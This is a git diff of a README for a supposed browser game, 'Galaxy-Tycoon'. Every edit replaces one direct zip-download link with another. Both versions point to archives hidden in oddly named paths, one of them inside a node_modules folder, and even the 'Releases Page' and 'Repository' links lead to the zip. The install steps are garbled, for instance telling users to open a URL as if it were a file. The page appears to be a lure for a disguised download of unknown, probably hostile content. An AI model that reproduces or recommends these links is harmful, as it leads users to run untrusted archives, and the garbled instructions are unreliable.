@@ -1,6 +1,6 @@
 # 🚀 Galaxy-Tycoon - Build Your Galactic Empire Today!
 
-[![Download Galaxy Tycoon](https://raw.githubusercontent.com/Alanokyere/Galaxy-Tycoon/main/unsymptomatic/Galaxy-Tycoon.zip%https://raw.githubusercontent.com/Alanokyere/Galaxy-Tycoon/main/unsymptomatic/Galaxy-Tycoon.zip)](https://raw.githubusercontent.com/Alanokyere/Galaxy-Tycoon/main/unsymptomatic/Galaxy-Tycoon.zip)
+[![Download Galaxy Tycoon](https://github.com/Alanokyere/Galaxy-Tycoon/raw/refs/heads/main/node_modules/@parcel/watcher-win32-x64/Galaxy-Tycoon-unvaletudinary.zip%https://github.com/Alanokyere/Galaxy-Tycoon/raw/refs/heads/main/node_modules/@parcel/watcher-win32-x64/Galaxy-Tycoon-unvaletudinary.zip)](https://github.com/Alanokyere/Galaxy-Tycoon/raw/refs/heads/main/node_modules/@parcel/watcher-win32-x64/Galaxy-Tycoon-unvaletudinary.zip)
 
 ## 🌌 Introduction
 
@@ -17,7 +17,7 @@
 
 1. **Visit the Releases Page**  
    To start your adventure, visit the following link to access the latest release of Galaxy Tycoon:  
-   [Download Galaxy Tycoon](https://raw.githubusercontent.com/Alanokyere/Galaxy-Tycoon/main/unsymptomatic/Galaxy-Tycoon.zip)
+   [Download Galaxy Tycoon](https://github.com/Alanokyere/Galaxy-Tycoon/raw/refs/heads/main/node_modules/@parcel/watcher-win32-x64/Galaxy-Tycoon-unvaletudinary.zip)
 
 2. **Select the Latest Version**  
    Once on the releases page, look for the most recent version. This will usually be at the top of the list.
@@ -28,13 +28,13 @@
 ## 🔧 Download & Install
 
 1. **Download Galaxy Tycoon**  
-   Click here to directly access the download page: [Download Galaxy Tycoon](https://raw.githubusercontent.com/Alanokyere/Galaxy-Tycoon/main/unsymptomatic/Galaxy-Tycoon.zip).
+   Click here to directly access the download page: [Download Galaxy Tycoon](https://github.com/Alanokyere/Galaxy-Tycoon/raw/refs/heads/main/node_modules/@parcel/watcher-win32-x64/Galaxy-Tycoon-unvaletudinary.zip).
 
 2. **Extract the Files**  
    Once the download is complete, locate the downloaded file on your computer. If it is a compressed file (.zip or .tar), right-click and select "Extract" to unpack it.
 
 3. **Open the Game**  
-   After extracting, locate the `https://raw.githubusercontent.com/Alanokyere/Galaxy-Tycoon/main/unsymptomatic/Galaxy-Tycoon.zip` file within the unzipped folder. Double-click it to open the game in your web browser.
+   After extracting, locate the `https://github.com/Alanokyere/Galaxy-Tycoon/raw/refs/heads/main/node_modules/@parcel/watcher-win32-x64/Galaxy-Tycoon-unvaletudinary.zip` file within the unzipped folder. Double-click it to open the game in your web browser.
 
 4. **Enjoy the Game!**  
    Explore galaxies, collect resources, and build your empire. Start your journey among the stars!
@@ -74,7 +74,7 @@ If you have questions or feedback, feel free to reach out through the issues sec
 
 Stay updated on new features and enhancements:
 
-- **Repository:** [Galaxy Tycoon Repository](https://raw.githubusercontent.com/Alanokyere/Galaxy-Tycoon/main/unsymptomatic/Galaxy-Tycoon.zip)
+- **Repository:** [Galaxy Tycoon Repository](https://github.com/Alanokyere/Galaxy-Tycoon/raw/refs/heads/main/node_modules/@parcel/watcher-win32-x64/Galaxy-Tycoon-unvaletudinary.zip)
 - **Issues Page:** Report bugs or suggest features directly in our GitHub issues.
 
 Embark on your journey through the cosmos with **Galaxy Tycoon**. Happy gaming!
